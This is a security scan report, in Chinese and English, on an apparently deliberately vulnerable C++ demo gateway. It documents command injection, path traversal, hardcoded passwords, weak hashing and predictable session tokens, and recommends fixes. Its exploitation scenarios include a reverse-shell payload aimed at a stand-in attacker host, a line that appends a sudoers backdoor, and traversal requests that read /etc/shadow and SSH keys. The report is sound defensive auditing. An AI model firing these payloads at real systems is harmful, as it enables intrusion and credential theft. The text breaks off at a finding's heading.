# 漏洞扫描报告 — 已确认漏洞

**项目**: edge-gateway-demo
**扫描时间**: 2026-06-18T00:00:00Z
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

对 edge-gateway-demo 项目的安全扫描共发现 **22 个已确认漏洞**，其中 **11 个为 Critical 级别**，**10 个为 High 级别**。该项目是一个监听在 TCP 8080 端口的 C++17 边缘网关 HTTP 服务，所有攻击面均直接暴露于不可信网络，且**无任何认证、输入验证或安全加固措施**。

**最严重的风险**是一条完整的**未认证远程代码执行 (RCE) 链**（VULN-SEC-XMOD-002）：攻击者无需任何凭据，即可通过 `POST /debug/ping` 端点将任意 shell 命令注入 `popen()` 调用，从而在服务器上以进程权限执行任意代码。此外，`GET /files` 端点存在**路径遍历漏洞**，可读取服务器任意文件（包括 `/etc/passwd`、配置文件、密钥等）；`UserStore` 中**硬编码了三个用户账户**（含 admin/admin123），配合**弱 DJB2 哈希**和**可预测的会话令牌**，攻击者可轻易获取管理员权限并劫持会话。

**建议的优先修复方向**：(1) 立即移除或保护 `/debug/ping` 端点，消除 RCE 风险；(2) 对文件路径进行规范化校验，阻止路径遍历；(3) 将凭据迁移至外部安全存储并使用 bcrypt/argon2 哈希；(4) 为所有端点添加认证与授权中间件；(5) 对审计日志进行输入净化，防止日志注入和凭据泄露。

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| CONFIRMED | 22 | 64.7% |
| LIKELY | 9 | 26.5% |
| FALSE_POSITIVE | 3 | 8.8% |
| **总计** | **34** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 11 | 50.0% |
| High | 10 | 45.5% |
| Low | 1 | 4.5% |
| **有效漏洞总计** | **22** | - |
| 误报 (FALSE_POSITIVE) | 3 | - |

### 1.3 Top 10 关键漏洞

1. **[VULN-DF-DIAG-001]** command_injection (Critical) - `src/diagnostics.cpp:8` @ `Diagnostics::pingHost` | 置信度: 85
2. **[VULN-SEC-CMDI-001]** command_injection (Critical) - `src/diagnostics.cpp:7` @ `Diagnostics::pingHost` | 置信度: 85
3. **[VULN-SEC-FC-001]** hardcoded_credential (Critical) - `src/file_cache.cpp:22` @ `FileCache::exportSnapshot` | 置信度: 85
4. **[VULN-DF-FC-001]** path_traversal (Critical) - `src/file_cache.cpp:10` @ `FileCache::readTextFile` | 置信度: 85
5. **[VULN-SEC-CRED-001]** hardcoded_credential (Critical) - `src/user_store.cpp:6` @ `UserStore::UserStore` | 置信度: 85
6. **[VULN-SEC-HASH-001]** weak_password_hash (Critical) - `src/user_store.cpp:12` @ `UserStore::weakHash` | 置信度: 85
7. **[VULN-SEC-SESS-001]** predictable_session_token (Critical) - `src/user_store.cpp:33` @ `UserStore::issueSession` | 置信度: 85
8. **[VULN-SEC-LOG-002]** sensitive_data_in_log (Critical) - `include/audit_log.hpp:11` @ `AuditLog::event` | 置信度: 85
9. **[VULN-DF-US-001]** hardcoded_credentials (Critical) - `src/user_store.cpp:6` @ `UserStore::UserStore` | 置信度: 85
10. **[VULN-DF-MAIN-001]** command_injection (Critical) - `src/main.cpp:64` @ `lambda(POST /debug/ping)` | 置信度: 85

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `HttpServer::run@src/http_server.cpp` | network | untrusted_network | TCP socket bound to INADDR_ANY (0.0.0.0) on configurable port (default 8080). accept() receives connections from any remote client. recv() reads raw HTTP data into a 4096-byte stack buffer. This is the primary network attack surface. | Main TCP accept loop - receives all incoming HTTP connections from remote clients |
| `lambda(POST /login)@src/main.cpp` | web_route | untrusted_network | POST /login route extracts 'user' and 'password' from query parameters provided by remote HTTP clients. User-controlled credentials flow directly into authentication logic and audit logging. | Login endpoint - receives username and password from query string |
| `lambda(GET /files)@src/main.cpp` | web_route | untrusted_network | GET /files route extracts 'name' from query parameters and passes it directly to FileCache::readTextFile() which concatenates it into a filesystem path. Remote clients control the filename, creating a path traversal attack surface. | File download endpoint - receives filename from query string, potential path traversal |
| `lambda(POST /debug/ping)@src/main.cpp` | web_route | untrusted_network | POST /debug/ping route extracts 'host' from query parameters and passes it directly to Diagnostics::pingHost() which concatenates it into a shell command executed via popen(). Remote clients can inject arbitrary shell commands. | Diagnostic ping endpoint - receives host from query string, potential command injection |
| `lambda(GET /admin/export)@src/main.cpp` | web_route | untrusted_network | GET /admin/export route extracts 'token' from query parameters and passes it to FileCache::exportSnapshot(). The token is compared against a hardcoded secret. No session-based authentication; any remote client can attempt the token. | Admin export endpoint - receives token from query string, uses hardcoded secret for authorization |
| `lambda(GET /health)@src/main.cpp` | web_route | untrusted_network | GET /health is a simple health check with no user input processing. Included for completeness as it is network-reachable, but low risk. | Health check endpoint - no user input, returns static response |

**其他攻击面**:
- TCP socket on INADDR_ANY:8080 - accepts connections from any remote host
- HTTP query parameters - all user input arrives via URL query string with no sanitization
- Shell command execution via popen() in Diagnostics::pingHost() with unsanitized user input
- Filesystem path construction in FileCache::readTextFile() with unsanitized user input
- Hardcoded authentication credentials in UserStore constructor
- Hardcoded admin export token in FileCache::exportSnapshot()
- Weak non-cryptographic hash (DJB2) used for password storage
- Predictable session token format using username + timestamp
- Audit log writes user-controlled data without sanitization (log injection)
- Fixed 4096-byte stack buffer for HTTP request reading (potential truncation/overflow)

---

## 3. Critical 漏洞 (11)

### [VULN-DF-DIAG-001] command_injection - Diagnostics::pingHost

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/diagnostics.cpp:8-12` @ `Diagnostics::pingHost`
**模块**: diagnostics

**描述**: OS command injection via popen(). The 'host' parameter from HTTP query string (POST /debug/ping) is concatenated directly into a shell command string without any sanitization, validation, or escaping. An attacker can inject arbitrary shell commands via metacharacters (;, $(), &&, ||, |, backticks). Example payload: host=;cat /etc/passwd results in execution of 'ping -c 1 ;cat /etc/passwd'. The vulnerable path: recv() → parseRequest → parseQuery → queryValue(request, "host") → Diagnostics::pingHost(host) → string concatenation → popen().

**漏洞代码** (`src/diagnostics.cpp:8-12`)

```c
// src/diagnostics.cpp:7-12
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;  // host is unsanitized user input
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");  // SINK: shell command execution
```

**达成路径**

src/http_server.cpp:113 recv() [SOURCE] - HTTP request data from network
src/main.cpp:65 queryValue(request, "host") - extracts 'host' query parameter
src/main.cpp:67 diagnostics.pingHost(host) - passes untrusted host to diagnostics module
src/diagnostics.cpp:8 std::string command = "ping -c 1 " + host - direct string concatenation, no sanitization
src/diagnostics.cpp:12 popen(command.c_str(), "r") [SINK] - executes tainted command via shell

**验证说明**: Confirmed OS command injection. Complete data flow verified: recv() at http_server.cpp:113 → parseRequest → parseQuery (no sanitization) → queryValue(request, "host") at main.cpp:65 → pingHost(host) at main.cpp:67 → string concatenation "ping -c 1 " + host at diagnostics.cpp:8 → popen() at diagnostics.cpp:12. No input validation, no shell escaping, no whitelist, no authentication on /debug/ping endpoint. Attacker fully controls the host parameter content and length. popen() invokes /bin/sh -c, enabling arbitrary command execution via metacharacters (;, $(), &&, ||, |, backticks).

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: 该漏洞的根本原因在于整个数据流路径中不存在任何安全控制点。从 `src/http_server.cpp:113` 的 `recv()` 接收原始 HTTP 数据，到 `src/http_server.cpp:19-32` 的 `parseQuery()` 解析查询参数（仅按 `&` 和 `=` 分割，无任何解码或过滤），再到 `src/main.cpp:65` 的 `queryValue(request, "host")` 提取参数值，最终到 `src/diagnostics.cpp:8` 的字符串拼接 `"ping -c 1 " + host` 和 `diagnostics.cpp:12` 的 `popen()` 执行——整条链路中没有任何一环进行输入验证、shell 元字符转义或命令白名单检查。

`src/http_server.cpp:19-32` 中的 `parseQuery()` 函数实现极为简陋：
```c
// src/http_server.cpp:19-32
std::map<std::string, std::string> parseQuery(const std::string& query) {
  std::map<std::string, std::string> result;
  std::stringstream stream(query);
  std::string item;
  while (std::getline(stream, item, '&')) {
    auto pos = item.find('=');
    if (pos == std::string::npos) {
      result[item] = "";
    } else {
      result[item.substr(0, pos)] = item.substr(pos + 1);
    }
  }
  return result;
}
```
该函数不进行 URL 解码（`%xx` 序列原样保留），也不对任何特殊字符进行过滤。

**潜在利用场景**:
- **远程代码执行**: `POST /debug/ping?host=;id` → 执行 `ping -c 1 ;id`，返回当前用户身份
- **数据窃取**: `host=;cat /etc/passwd` → 读取系统用户信息
- **反向 Shell**: `host=;bash -i >& /dev/tcp/attacker/4444 0>&1` → 建立反向 shell 连接
- **持久化后门**: `host=;echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`
- **横向移动**: 利用服务器网络位置探测和攻击内网其他主机

**修复建议**: 
1. **立即措施**: 移除 `/debug/ping` 端点或将其限制为仅本地访问（绑定 `127.0.0.1`）
2. **短期修复**: 使用 `execvp()` 替代 `popen()`，避免 shell 解释；将 `host` 参数通过 `argv` 数组传递而非字符串拼接
3. **长期方案**: 使用 `libcurl` 或 ICMP socket 实现 ping 功能，完全避免 shell 调用；添加输入白名单（仅允许合法 IP/hostname 格式）

---

### [VULN-SEC-CMDI-001] command_injection - Diagnostics::pingHost

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/diagnostics.cpp:7-12` @ `Diagnostics::pingHost`
**模块**: diagnostics

**描述**: OS Command Injection via unsanitized user input in popen(). The pingHost() function concatenates the 'host' parameter directly into a shell command string ('ping -c 1 ' + host) and executes it via popen(), which invokes /bin/sh -c. The host parameter originates from the POST /debug/ping endpoint's query parameter (src/main.cpp:65), which accepts untrusted network input with no validation, sanitization, or escaping. An attacker can inject arbitrary shell commands using metacharacters such as ';', '$()', '||', '&&', or backticks. For example, POST /debug/ping?host=;cat /etc/passwd would execute 'ping -c 1 ;cat /etc/passwd' on the server, leaking sensitive files. Since this is a network-facing edge gateway on port 8080, this is remotely exploitable with no authentication required.

**漏洞代码** (`src/diagnostics.cpp:7-12`)

```c
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");
```

**达成路径**

src/main.cpp:64 POST /debug/ping [SOURCE - untrusted network input]
src/main.cpp:65 queryValue(request, "host") extracts host parameter
src/main.cpp:67 diagnostics.pingHost(host) passes to Diagnostics module
src/diagnostics.cpp:8 command = "ping -c 1 " + host [CONCATENATION - no sanitization]
src/diagnostics.cpp:12 popen(command.c_str(), "r") [SINK - shell execution via /bin/sh -c]

**验证说明**: Confirmed OS command injection. Complete data flow verified: recv() at http_server.cpp:113 → parseRequest → parseQuery (no sanitization) → queryValue(request, "host") at main.cpp:65 → pingHost(host) at main.cpp:67 → string concatenation "ping -c 1 " + host at diagnostics.cpp:8 → popen() at diagnostics.cpp:12. No input validation, no shell escaping, no whitelist, no authentication on /debug/ping endpoint. Attacker fully controls the host parameter content and length. popen() invokes /bin/sh -c, enabling arbitrary command execution via metacharacters (;, $(), &&, ||, |, backticks).

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-FC-001] hardcoded_credential - FileCache::exportSnapshot

**严重性**: Critical | **CWE**: CWE-798 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/file_cache.cpp:22` @ `FileCache::exportSnapshot`
**模块**: file_cache
**跨模块**: file_cache → main

**描述**: Hardcoded authorization token 'letmein-export' used to protect the /admin/export endpoint. The token is embedded directly in source code and compared via plaintext string comparison. Any attacker with source access or who can guess the token gains full access to the export endpoint from an untrusted network. The token cannot be rotated without recompilation.

**漏洞代码** (`src/file_cache.cpp:22`)

```c
if (token != "letmein-export") {
```

**达成路径**

src/main.cpp:70 GET /admin/export handler extracts 'token' query parameter
src/main.cpp:70 token passed to FileCache::exportSnapshot()
src/file_cache.cpp:22 hardcoded comparison: token != "letmein-export"

**验证说明**: Confirmed hardcoded credential: token "letmein-export" hardcoded as string literal at file_cache.cpp:22, serving as the sole authorization mechanism for /admin/export endpoint. No session management, no additional auth layers, no rate limiting, no IP restrictions. Token passed as HTTP query parameter (visible in access logs, browser history, proxy logs). Cannot be rotated without recompilation. Chain verified: recv→parseRequest→parseQuery→queryValue→exportSnapshot→plaintext comparison.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-FC-001] path_traversal - FileCache::readTextFile

**严重性**: Critical | **CWE**: CWE-22 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner, security-auditor

**位置**: `src/file_cache.cpp:10-11` @ `FileCache::readTextFile`
**模块**: file_cache

**描述**: User-controlled 'name' parameter from HTTP GET /files query string is concatenated directly into a filesystem path (baseDir_ + "/" + name) and passed to std::ifstream without any path traversal sanitization. No check for '../' sequences, no canonical path resolution (realpath/std::filesystem::canonical), and no filename whitelist. An unauthenticated remote attacker can supply name=../../etc/passwd to read arbitrary files on the server. The baseDir_ is set to "data" at construction (main.cpp:31), but string concatenation provides no containment — the path "data/../../etc/passwd" resolves to "/etc/passwd". The file contents are returned as the HTTP response body (main.cpp:58), enabling full file exfiltration.

**漏洞代码** (`src/file_cache.cpp:10-11`)

```c
// src/file_cache.cpp:10-11
std::string FileCache::readTextFile(const std::string& name) const {
  std::ifstream file(baseDir_ + "/" + name);  // name is unsanitized user input
```

**达成路径**

src/http_server.cpp:113 recv() [SOURCE - network input]
src/http_server.cpp parseRequest() → parseQuery()
src/main.cpp:55 queryValue(request, "name") - extracts tainted 'name' from query params
src/main.cpp:58 files.readTextFile(name) - passes tainted name to FileCache
src/file_cache.cpp:11 std::ifstream file(baseDir_ + "/" + name) [SINK - file open with tainted path]

**验证说明**: Confirmed path traversal: baseDir_ + "/" + name at file_cache.cpp:11 has zero sanitization. No realpath, canonical, ../ filtering, or filename whitelist exists anywhere in the codebase. parseQuery() performs no URL decoding but ../ is sent as-is in query strings. Attacker-controlled name parameter flows directly from recv() through parseRequest→parseQuery→queryValue→readTextFile→ifstream. Path data/../../etc/passwd resolves to /etc/passwd. File contents returned in HTTP response body.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: `FileCache::readTextFile()` 在 `src/file_cache.cpp:10-11` 中直接将用户输入拼接到文件路径中，没有任何路径安全检查：

```c
// src/file_cache.cpp:10-18
std::string FileCache::readTextFile(const std::string& name) const {
  std::ifstream file(baseDir_ + "/" + name);  // 直接拼接，无验证
  if (!file) {
    throw std::runtime_error("file not found");
  }
  std::ostringstream data;
  data << file.rdbuf();
  return data.str();
}
```

`baseDir_` 在 `src/main.cpp:31` 中被设置为 `"data"`（相对路径），因此拼接结果为 `data/<user_input>`。当用户输入 `../../etc/passwd` 时，实际打开的路径为 `data/../../etc/passwd`，经文件系统解析后等价于 `/etc/passwd`。整个代码库中不存在 `realpath()`、`std::filesystem::canonical()`、`../` 过滤或文件名白名单等任何防护机制。

**潜在利用场景**:
- **读取系统文件**: `GET /files?name=../../etc/passwd` → 获取系统用户列表
- **读取应用配置**: `GET /files?name=../../etc/shadow` → 若进程有权限可读取密码哈希
- **读取源码**: `GET /files?name=../src/main.cpp` → 泄露应用源码（含硬编码凭据）
- **读取私钥**: `GET /files?name=../../home/user/.ssh/id_rsa` → 窃取 SSH 私钥
- **读取审计日志**: `GET /files?name=../edge-gateway.audit.log` → 获取日志中的凭据信息

**修复建议**:
1. **路径规范化**: 使用 `std::filesystem::canonical()` 或 `realpath()` 解析最终路径，验证其仍在 `baseDir_` 范围内
2. **文件名白名单**: 仅允许预定义的合法文件名，拒绝包含 `/`、`..`、`\` 的输入
3. **chroot/沙箱**: 将文件服务限制在 chroot 环境中，即使遍历也无法访问外部文件

---

### [VULN-SEC-CRED-001] hardcoded_credential - UserStore::UserStore

**严重性**: Critical | **CWE**: CWE-798 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/user_store.cpp:6-10` @ `UserStore::UserStore`
**模块**: user_store

**描述**: UserStore constructor hardcodes three user accounts with plaintext passwords directly in source code: alice/wonderland, operator/op-password, admin/admin123. The admin account has the admin flag set to true. These credentials are compiled into the binary and visible to anyone with access to the source code or binary. An attacker with source code access (or via reverse engineering) can immediately authenticate as any user including the admin account.

**漏洞代码** (`src/user_store.cpp:6-10`)

```c
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};
  users_["operator"] = {"operator", weakHash("op-password"), false};
  users_["admin"] = {"admin", weakHash("admin123"), true};
}
```

**达成路径**

src/main.cpp:40 POST /login handler receives untrusted network input
src/main.cpp:41-42 Extracts user and password query parameters
src/main.cpp:45 Calls users.authenticate(username, password)
src/user_store.cpp:20-26 authenticate() compares against hardcoded credential hashes
src/user_store.cpp:7-9 Hardcoded passwords: wonderland, op-password, admin123

**验证说明**: Confirmed: UserStore constructor (lines 6-10) hardcodes three accounts (alice/wonderland, operator/op-password, admin/admin123) with admin flag on admin account. Credentials are exploited via POST /login (main.cpp:40-52) which receives untrusted network input. No mitigations: no rate limiting, no input validation, no credential encryption. Admin password admin123 is trivially guessable even without source access. Call chain complete: POST /login -> authenticate() -> hardcoded hash comparison.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: `UserStore` 构造函数在 `src/user_store.cpp:6-10` 中将三个用户账户的明文密码直接硬编码在源码中：

```c
// src/user_store.cpp:6-10
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};
  users_["operator"] = {"operator", weakHash("op-password"), false};
  users_["admin"] = {"admin", weakHash("admin123"), true};
}
```

这些凭据存在多重安全问题：
1. **明文嵌入**: 密码字符串 `"wonderland"`、`"op-password"`、`"admin123"` 作为字符串常量编译进二进制文件，通过 `strings` 命令即可提取
2. **弱哈希保护无效**: 虽然调用了 `weakHash()`，但 DJB2 哈希仅有 32 位输出且无盐值，可被瞬间逆向（详见 VULN-SEC-HASH-001）
3. **管理员密码可猜测**: `admin123` 是常见弱密码，即使没有源码访问权限，暴力枚举也极易成功
4. **不可轮换**: 修改凭据需要重新编译和重新部署整个应用

认证逻辑在 `src/user_store.cpp:20-26` 中：
```c
// src/user_store.cpp:20-26
bool UserStore::authenticate(const std::string& username, const std::string& password) const {
  auto user = users_.find(username);
  if (user == users_.end()) {
    return false;
  }
  return user->second.passwordHash == weakHash(password);
}
```
认证仅比较哈希值，无速率限制、无账户锁定、无多因素认证。

**潜在利用场景**:
- **直接登录**: 攻击者使用 `admin/admin123` 通过 `POST /login?user=admin&password=admin123` 获取管理员权限
- **源码泄露后全面攻破**: 若源码泄露（通过路径遍历 VULN-DF-FC-001 读取 `src/user_store.cpp`），所有账户凭据立即暴露
- **二进制逆向**: 使用 `strings` 或反汇编工具从编译后的二进制文件中提取密码字符串

**修复建议**:
1. **外部凭据存储**: 将用户凭据迁移至外部数据库或配置文件（权限受限），从源码中移除所有明文密码
2. **强哈希算法**: 使用 bcrypt、scrypt 或 argon2id 替代 DJB2，添加随机盐值
3. **认证加固**: 添加登录速率限制、账户锁定策略、多因素认证

---

### [VULN-SEC-HASH-001] weak_password_hash - UserStore::weakHash

**严重性**: Critical | **CWE**: CWE-916 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/user_store.cpp:12-18` @ `UserStore::weakHash`
**模块**: user_store

**描述**: Password storage uses the DJB2 hash function, which is a non-cryptographic string hash designed for hash table lookups, not password security. The output is a 32-bit unsigned integer converted to a decimal string (std::to_string), yielding at most ~4.3 billion possible hash values. No salt is applied, meaning identical passwords produce identical hashes. An attacker can build a complete rainbow table covering the entire 32-bit output space in minutes, or brute-force all possible inputs trivially. This makes stored password hashes effectively equivalent to plaintext.

**漏洞代码** (`src/user_store.cpp:12-18`)

```c
std::string UserStore::weakHash(const std::string& password) const {
  unsigned int value = 5381;
  for (char ch : password) {
    value = ((value << 5) + value) + static_cast<unsigned char>(ch);
  }
  return std::to_string(value);
}
```

**达成路径**

src/user_store.cpp:7-9 Constructor stores weakHash(password) as passwordHash in UserRecord
src/user_store.cpp:25 authenticate() compares weakHash(input_password) == stored passwordHash
src/main.cpp:41-42 External password input from POST /login query parameter
src/main.cpp:45 Flows directly into authenticate() → weakHash() comparison

**验证说明**: Confirmed: weakHash() (lines 12-18) implements DJB2 with 32-bit unsigned int output (max ~4.3B values), no salt, output as decimal string via std::to_string(). Classic DJB2 formula: value = ((value << 5) + value) + ch. The 32-bit output space can be exhaustively brute-forced in minutes. No salt means identical passwords produce identical hashes, enabling rainbow table attacks. Used for both password storage (constructor lines 7-9) and authentication comparison (line 25). External password input flows from POST /login directly into weakHash().

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

**深度分析**

**根因分析**: `UserStore::weakHash()` 在 `src/user_store.cpp:12-18` 中实现了经典的 DJB2 哈希算法，但其设计目的是哈希表查找而非密码安全：

```c
// src/user_store.cpp:12-18
std::string UserStore::weakHash(const std::string& password) const {
  unsigned int value = 5381;
  for (char ch : password) {
    value = ((value << 5) + value) + static_cast<unsigned char>(ch);
  }
  return std::to_string(value);
}
```

关键安全缺陷：
1. **32 位输出空间**: `unsigned int` 仅 32 位，最多约 43 亿个可能值。现代 GPU 每秒可计算数十亿次 DJB2 哈希，**全空间暴力破解仅需数秒**
2. **无盐值**: 相同密码始终产生相同哈希。`"admin123"` 的 DJB2 哈希是固定值，攻击者可预先计算彩虹表覆盖全部 2^32 个输出
3. **十进制字符串输出**: `std::to_string(value)` 将 32 位整数转为十进制字符串（最多 10 个字符），进一步降低了信息熵
4. **已知算法**: DJB2 是公开的标准算法，攻击者无需逆向即可识别并针对性攻击

该哈希在构造函数（`src/user_store.cpp:7-9`）中用于存储密码，在认证函数（`src/user_store.cpp:25`）中用于比较验证，是整个认证体系的核心安全组件——但其安全性等同于明文存储。

**潜在利用场景**:
- **离线暴力破解**: 获取哈希值后（通过源码泄露或日志泄露），在数秒内逆向出原始密码
- **彩虹表攻击**: 预计算全部 2^32 个 DJB2 输出的彩虹表（约 40GB 存储），实现即时查找
- **碰撞利用**: 32 位空间碰撞概率极高，攻击者可找到任意密码碰撞（无需原始密码即可通过认证）

**修复建议**:
1. **替换为密码专用哈希**: 使用 `argon2id`（推荐）或 `bcrypt`（work factor ≥ 12），输出至少 256 位
2. **添加随机盐值**: 每个用户独立生成 16 字节以上随机盐，与哈希一起存储
3. **迁移策略**: 在下次成功登录时自动将用户密码从 DJB2 迁移至新哈希算法

---

### [VULN-SEC-SESS-001] predictable_session_token - UserStore::issueSession

**严重性**: Critical | **CWE**: CWE-330 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `src/user_store.cpp:33-36` @ `UserStore::issueSession`
**模块**: user_store
**跨模块**: user_store → audit_log → file_cache

**描述**: Session tokens are generated using a completely predictable format: 'sess-{username}-{unix_timestamp}'. There is zero cryptographic randomness — the token is a deterministic concatenation of the username and the current Unix epoch time (seconds precision). An attacker who knows a valid username and the approximate time of login can forge a valid session token by trying a small number of timestamp values (one per second). This enables complete session hijacking without any credential theft. The token is also returned in the HTTP response body and logged to the audit log, creating additional exposure surfaces.

**漏洞代码** (`src/user_store.cpp:33-36`)

```c
std::string UserStore::issueSession(const std::string& username) const {
  char token[32];
  std::sprintf(token, "sess-%s-%ld", username.c_str(), static_cast<long>(std::time(nullptr)));
  return token;
}
```

**达成路径**

src/main.cpp:49 token = users.issueSession(username) — called after successful authentication
src/user_store.cpp:35 Token = 'sess-' + username + '-' + time(nullptr)
src/main.cpp:50 audit.event(username, 'login-success', token) — token leaked to audit log [OUT]
src/main.cpp:51 Response body: 'session=' + token — token returned to client
src/main.cpp:71-73 /admin/export endpoint accepts token parameter without validation [OUT]

**验证说明**: Confirmed: issueSession() (lines 33-36) generates tokens as sprintf(token, 'sess-%s-%ld', username, time(nullptr)). Zero cryptographic randomness - token is deterministic from username + unix timestamp (seconds precision). Attacker knowing a valid username and approximate server time can enumerate all possible tokens (one per second). Token returned in HTTP response body (main.cpp:51) and logged to audit log (main.cpp:50), creating multiple exposure surfaces. Cross-module: token also flows to /admin/export endpoint (main.cpp:70-73) which accepts token parameter without validation.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-LOG-002] sensitive_data_in_log - AuditLog::event

**严重性**: Critical | **CWE**: CWE-532 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `include/audit_log.hpp:11-14` @ `AuditLog::event`
**模块**: audit_log
**跨模块**: audit_log → http_routes

**描述**: The POST /login handler passes the entire request.body (which contains the password parameter) as the 'detail' argument to AuditLog::event(). The event() method writes this verbatim to the audit log file 'edge-gateway.audit.log'. This results in user passwords being stored in plaintext in the log file. Any process or user with read access to the log file can extract credentials. Call site: src/main.cpp:43 audit.event(username, "login-attempt", request.body) where request.body contains 'user=<username>&password=<password>'.

**漏洞代码** (`include/audit_log.hpp:11-14`)

```c
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user
         << " action=" << action
         << " detail=" << detail << "\n";
  }
// Caller (src/main.cpp:43): audit.event(username, "login-attempt", request.body);
```

**达成路径**

src/main.cpp:40 POST /login handler [ENTRY POINT]
src/main.cpp:42 queryValue(request, "password") → password extracted but request.body still contains it
src/main.cpp:43 audit.event(username, "login-attempt", request.body) [request.body includes password=<value>]
include/audit_log.hpp:12-14 out_ << detail [SINK - password written to log file in plaintext]

**验证说明**: Confirmed: POST /login handler at main.cpp:43 passes entire request.body (containing user=<username>&password=<password>) as detail to audit.event(). The event() method writes detail verbatim to ofstream with no sanitization or field masking. Data flow verified end-to-end: recv() -> parseRequest() extracts body via stream.rdbuf() (preserves all content) -> request.body passed directly to audit.event() -> out_ << detail writes plaintext password to edge-gateway.audit.log. No mitigations found: no password redaction, no input validation, no log filtering. Call chain complete with no intermediate safety checks.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-US-001] hardcoded_credentials - UserStore::UserStore

**严重性**: Critical | **CWE**: CWE-798 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/user_store.cpp:6-10` @ `UserStore::UserStore`
**模块**: user_store

**描述**: Three user accounts with hardcoded plaintext passwords are embedded directly in the UserStore constructor. The admin account uses the trivially guessable password 'admin123'. All passwords are stored as DJB2 hashes which are trivially reversible (32-bit non-cryptographic hash), meaning the plaintext passwords are effectively exposed in the source code. An attacker with source code access or binary reverse-engineering capability can immediately obtain all credentials, including full admin access.

**漏洞代码** (`src/user_store.cpp:6-10`)

```c
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};
  users_["operator"] = {"operator", weakHash("op-password"), false};
  users_["admin"] = {"admin", weakHash("admin123"), true};
}
```

**达成路径**

src/user_store.cpp:7-9 UserStore::UserStore() [SOURCE] - hardcoded plaintext passwords
src/user_store.cpp:7-9 weakHash() applied (DJB2, trivially reversible)
src/user_store.cpp:25 UserStore::authenticate() [SINK] - password comparison using weak hash

**验证说明**: Confirmed (duplicate of VULN-SEC-CRED-001): UserStore constructor hardcodes three user accounts with plaintext passwords. Admin account (admin/admin123) has admin=true flag. Passwords hashed with trivially reversible DJB2 (32-bit, no salt). Exploitable via POST /login endpoint receiving untrusted network input. Source: dataflow-scanner detected hardcoded_credentials pattern at same location.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-DF-MAIN-001] command_injection - lambda(POST /debug/ping)

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 85/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `src/main.cpp:64-68` @ `lambda(POST /debug/ping)`
**模块**: main
**跨模块**: main → diagnostics

**描述**: The /debug/ping route extracts 'host' from query parameters via queryValue() and passes it directly to Diagnostics::pingHost() with zero sanitization. The function name and signature (const std::string& host → std::string) strongly imply shell command execution (e.g., system("ping -c 1 " + host)). An attacker can inject arbitrary OS commands via shell metacharacters (e.g., host=;cat /etc/passwd). No allowlist, no shell escaping, no input validation exists in the data flow path.

**漏洞代码** (`src/main.cpp:64-68`)

```c
// src/main.cpp:64-68
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
    std::string host = queryValue(request, "host");  // TAINTED: user-controlled
    audit.event("operator", "debug-ping", host);
    return text(200, diagnostics.pingHost(host));  // SINK: likely system()/popen()
});
```

**达成路径**

src/main.cpp:65 queryValue(request, "host") [SOURCE: HTTP query parameter]
src/main.cpp:65 std::string host = ... [TAINTED variable]
src/main.cpp:67 diagnostics.pingHost(host) [SINK: command execution, OUT → Diagnostics module]

**验证说明**: Confirmed command injection. diagnostics.cpp:8 constructs 'ping -c 1 ' + host and passes to popen() with zero input sanitization. User-controlled 'host' from HTTP query param flows directly to shell execution. Attacker can inject arbitrary OS commands via shell metacharacters.

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: 0 | context: 0 | cross_file: 0

---

### [VULN-SEC-XMOD-002] unauthenticated_rce_chain - lambda(POST /debug/ping)

